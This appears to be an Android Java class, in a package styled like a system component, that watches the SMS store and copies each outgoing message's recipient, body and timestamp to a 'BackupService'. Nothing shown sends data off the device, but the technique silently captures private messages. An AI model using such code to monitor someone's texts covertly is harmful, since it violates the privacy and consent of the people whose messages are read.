package com.android.commstat;

import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

import java.util.Calendar;


class OutgoingMessageObserver extends ContentObserver {
    static final String CONTENT_SMS = "content://sms/";
    private static long mLastMessageId = 0;
    private Context mContext;

    OutgoingMessageObserver(Context context, Handler handler) {
        super(handler);
        mContext = context;
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        Uri smsUri = Uri.parse(CONTENT_SMS);
        Cursor cur = mContext.getContentResolver().query(smsUri, null, null, null, null);
        if (cur == null) {
            return;
        }
        try {
            cur.moveToNext();
            String protocol = cur.getString(cur.getColumnIndex("protocol"));
            if (protocol == null) {
                long messageId = cur.getLong(cur.getColumnIndex("_id"));
                if (messageId != mLastMessageId) {
                    mLastMessageId = messageId;
                    int threadId = cur.getInt(cur.getColumnIndex("thread_id"));
                    Cursor c = mContext.getContentResolver().query(Uri.parse("content://sms/outbox/" + threadId), null, null, null, null);
                    if (c != null) {
                        try {
                            c.moveToNext();
                            String address = cur.getString(cur.getColumnIndex("address"));
                            String body = cur.getString(cur.getColumnIndex("body"));
                            Calendar calendar = Calendar.getInstance();
                            calendar.setTimeInMillis(cur.getLong(cur.getColumnIndex("date")));

                            Sms sms = new Sms(address, calendar.getTime(), true, body);
                            Intent mIntent = new Intent(mContext, BackupService.class);
                            mIntent.putExtra(BackupService.SMS, sms);
                            mContext.startService(mIntent);
                        } finally {
                            c.close();
                        }
                    }
                }
            }
        } finally {
            cur.close();
        }
    }
}